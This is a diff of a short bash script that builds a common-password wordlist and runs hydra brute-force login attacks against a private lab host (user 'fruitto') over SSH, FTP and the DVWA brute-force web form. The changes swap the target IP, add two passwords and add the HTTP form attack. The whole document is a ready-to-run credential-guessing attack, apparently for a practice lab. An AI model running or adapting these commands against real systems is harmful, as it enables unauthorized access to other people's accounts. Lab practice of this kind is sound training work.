@@ -1,11 +1,10 @@
 #!/bin/bash
 
-TARGET="192.168.122.103"
+TARGET="192.168.122.109"
 USERNAME="fruitto"
 WORDLIST="wordlist_test.txt"
 
-# สร้าง wordlist
-cat <<EOF > $WORDLIST
+cat <<EOF >$WORDLIST
 123456
 password
 admin123
@@ -16,12 +15,14 @@ letmein
 wrongpass1
 wrongpass2
 wrongpass3
+P@ssword
+rootroot
 EOF
 
-echo "[*] Start SSH brute force..."
-hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V
+hydra -l $USERNAME -P $WORDLIST $TARGET http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect." -V -o brute_results.txt
 
-echo "[*] Start FTP brute force..."
+hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V
 hydra -l $USERNAME -P $WORDLIST $TARGET ftp -t 4 -V
 
 rm $WORDLIST
+
